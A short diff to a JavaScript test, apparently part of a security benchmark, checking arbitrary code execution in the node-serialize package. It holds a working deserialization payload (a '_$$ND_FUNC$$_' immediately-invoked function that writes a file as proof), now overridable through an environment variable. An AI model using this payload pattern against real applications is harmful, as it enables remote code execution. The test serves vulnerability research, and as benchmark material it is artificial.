@@ -3,8 +3,8 @@ test("Arbitrary code execution in node-serialize", () => {
   const fs = require("fs");
   const serialize = require("node-serialize");
   const path = "./node-serialize";
-  let payload =
-    '{"rce":"_$$ND_FUNC$$_function (){require(`fs`).writeFileSync(`node-serialize`,``);}()"}';
+  let payload = process.env.SECBENCH_PAYLOAD || (
+    '{"rce":"_$$ND_FUNC$$_function (){require(`fs`).writeFileSync(`node-serialize`,``);}()"}');
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(false);
   try {
